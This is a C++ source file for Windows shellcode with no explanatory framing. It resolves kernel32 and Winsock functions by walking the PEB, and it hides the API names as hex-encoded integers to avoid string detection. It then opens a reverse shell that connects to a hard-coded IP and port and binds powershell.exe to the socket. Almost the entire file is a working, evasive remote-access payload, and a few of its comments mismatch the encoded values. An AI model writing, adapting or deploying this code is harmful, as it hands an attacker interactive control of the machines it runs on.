#include <WinSock2.h>
#include <windows.h>
#include <winternl.h>
#include <ws2tcpip.h>
#include <cstdint>

__declspec(noinline) void customshellcode() {

    WSAData wsadata;
    struct sockaddr_in sock_addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HMODULE ntdll;
    HMODULE user32;
    HMODULE ws2_32;
    HMODULE kernel32;

    PPEB peb = (PPEB)__readgsqword(0x60); // gs 0x60 & fs 0x30

    PPEB_LDR_DATA peb_ldr_data = (PPEB_LDR_DATA)peb->Ldr;

    PLDR_DATA_TABLE_ENTRY ntdllEntry = CONTAINING_RECORD(peb->Ldr->InMemoryOrderModuleList.Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    PIMAGE_DOS_HEADER ntdllDosHeader = (PIMAGE_DOS_HEADER)ntdllEntry->DllBase;
    ntdll = (HMODULE)ntdllDosHeader;

    PLDR_DATA_TABLE_ENTRY kernel32Entry = CONTAINING_RECORD(peb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    PIMAGE_DOS_HEADER kernel32DosHeader = (PIMAGE_DOS_HEADER)kernel32Entry->DllBase;
    PIMAGE_NT_HEADERS64 kernel32NtHeader = (PIMAGE_NT_HEADERS64)((BYTE*)kernel32DosHeader + kernel32DosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY kernel32ExportsTable = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)kernel32DosHeader + kernel32NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* kernel32addressOfFunctions = (DWORD*)((BYTE*)kernel32DosHeader + kernel32ExportsTable->AddressOfFunctions);
    DWORD* kernel32addressOfNames = (DWORD*)((BYTE*)kernel32DosHeader + kernel32ExportsTable->AddressOfNames);
    WORD* kernel32addressOfNameOrdinals = (WORD*)((BYTE*)kernel32DosHeader + kernel32ExportsTable->AddressOfNameOrdinals);

    struct {
        uint64_t t0, t1;
    } text;

    // Ntdll
    typedef void (*_memset)(void*, int, size_t);

    // User32
    typedef int (*_MessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);

    // Winsock
    typedef int (*_WSAStartup)(WORD, LPWSADATA);
    typedef SOCKET(*_WSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
    typedef int (*_WSAConnect)(SOCKET, const sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
    typedef int (*_send)(SOCKET, const char*, int, int);
    typedef int (*_recv)(SOCKET, char*, int, int);
    typedef u_short(*_htons)(u_short);
    typedef unsigned long(*_inet_addr)(const char*);

    // Kernel32
    typedef FARPROC(*_GetProcAddress)(HMODULE, LPCSTR);
    typedef HMODULE(*_LoadLibraryA)(LPCSTR);
    typedef BOOL(*_CreateProcessA)(LPCSTR, LPCSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

    _GetProcAddress GetProcAddress = nullptr;
    _LoadLibraryA LoadLibraryA = nullptr;
    _MessageBox MessageBox = nullptr;
    _WSAStartup WSAStartup = nullptr;
    _WSASocketA WSASocketA = nullptr;
    _WSAConnect WSAConnect = nullptr;
    _send send = nullptr;
    _recv recv = nullptr;
    _memset memset = nullptr;
    _htons htons = nullptr;
    _inet_addr inet_addr = nullptr;
    _CreateProcessA CreateProcessA = nullptr;

    for (DWORD i = 0; i < kernel32ExportsTable->NumberOfNames; i++) {

        DWORD functionRVA = kernel32addressOfFunctions[i];
        const char* functionName = (const char*)((BYTE*)kernel32DosHeader + functionRVA);
        const char* exportedName = (const char*)((BYTE*)kernel32DosHeader + kernel32addressOfNames[i]);

        // GetProcAddress
        // 47 65 74 50 72 6F 63 41
        // 64 64 72 65 73 73
        uint64_t GetProcA = 0x41636F7250746547;
        if (*(uint64_t*)((size_t)kernel32DosHeader + kernel32addressOfNames[i]) == GetProcA) {

            GetProcAddress = (_GetProcAddress)(const void*)((size_t)kernel32DosHeader + kernel32addressOfFunctions[kernel32addressOfNameOrdinals[i]]);

            // LoadLibraryA
            // 4C 6F 61 64 4C 69 62 72
            // 61 72 79 41
            text.t0 = 0x7262694C64616F4C;
            text.t1 = 0x0000000041797261;

            kernel32 = (HMODULE)kernel32DosHeader;
            LoadLibraryA = (_LoadLibraryA)GetProcAddress(kernel32, (LPSTR)&text.t0);

            // User32.dll
            // 75 73 65 72 33 32 2E 64 
            // 6C 6C
            text.t0 = 0x642E323372657375;
            text.t1 = 0x0000000000006C6C;
            user32 = LoadLibraryA((const char*)&text.t0);

            // LoadLibraryA 
            // 4D 65 73 73 61 67 65 42 
            // 6F 78 41
            text.t0 = 0x426567617373654D;
            text.t1 = 0x000000000041786F;
            MessageBox = (_MessageBox)GetProcAddress(user32, (LPSTR)&text.t0);

            // Ws2_32.dll
            // 57 73 32 5F 33 32 2E 64
            // 6C 6C
            text.t0 = 0x642E32335F327357;
            text.t1 = 0x0000000000006C6C;
            ws2_32 = LoadLibraryA((const char*)&text.t0);

            // WSAStartup
            // 57 53 41 53 74 61 72 74 
            // 75 70
            text.t0 = 0x7472617453415357;
            text.t1 = 0x0000000000007075;
            WSAStartup = (_WSAStartup)GetProcAddress((HMODULE)ws2_32, (const char*)&text.t0);

            // WSASocketA
            // 57 53 41 53 6F 63 6B 65 
            // 74 41
            text.t0 = 0x656B636F53415357;
            text.t1 = 0x0000000000004174;
            WSASocketA = (_WSASocketA)GetProcAddress((HMODULE)ws2_32, (const char*)&text.t0);

            // WSAConnect
            // 57 53 41 43 6F 6E 6E 65 
            // 63 74
            text.t0 = 0x656E6E6F43415357;
            text.t1 = 0x0000000000007463;
            WSAConnect = (_WSAConnect)GetProcAddress((HMODULE)ws2_32, (const char*)&text.t0);

            // memset 
            // 6D 65 6D 73 65 74
            text.t0 = 0x00007465736D656D;
            text.t1 = 0x0000000000000000;
            memset = (_memset)GetProcAddress((HMODULE)ntdll, (const char*)&text.t0);

            // send
            // 73 65 6E 64
            text.t0 = 0x00000000646E6573;
            send = (_send)GetProcAddress((HMODULE)ws2_32, (const char*)&text.t0);

            // recv
            // 72 65 63 76
            text.t0 = 0x0000000076636572;
            recv = (_recv)GetProcAddress((HMODULE)ws2_32, (const char*)&text.t0);

            // htons
            // 68 74 6F 6E 73
            text.t0 = 0x000000736E6F7468;
            htons = (_htons)GetProcAddress((HMODULE)ws2_32, (const char*)&text.t0);

            // inet_addr
            // 69 6E 65 74 5F 61 64 64 
            // 72
            text.t0 = 0x6464615F74656E69;
            text.t1 = 0x0000000000000072;
            inet_addr = (_inet_addr)GetProcAddress((HMODULE)ws2_32, (const char*)&text.t0);

            // CreateProcessA
            // 43 72 65 61 74 65 50 72 
            // 6F 63 65 73 73 41
            text.t0 = 0x7250657461657243;
            text.t1 = 0x000041737365636F;
            CreateProcessA = (_CreateProcessA)GetProcAddress((HMODULE)kernel32, (const char*)&text.t0);

            break;
        }
    }

    // Reverse shell inspired by https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html by @cocomelonc

    int init = WSAStartup(MAKEWORD(2, 2), &wsadata);
    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    // 2106
    // 08 3A
    text.t0 = 0x83A;
    text.t1 = 0x0000000000000000;

    short port = static_cast<short>(text.t0);
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(port);

    // 172.19.192.197
    // 31 37 32 2E 31 39 2E 31 
    // 39 32 2E 31 39 37
    text.t0 = 0x2E3836312E323931; // "192.168"
    text.t1 = 0x003033312E303132; // "210.130"

    sock_addr.sin_addr.s_addr = inet_addr((const char*)&text.t0);

    int conn = WSAConnect(sock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);
    memset(&si, 0, sizeof(si));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // powershell.exe
    // 70 6F 77 65 72 73 68 65  
    // 6C 6C 2E 65 78 65
    text.t0 = 0x6568737265776F70;
    text.t1 = 0x00006578652E6C6C;

    CreateProcessA(NULL, (const char*)&text.t0, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
}

int main() {

    customshellcode();
    return 0;
}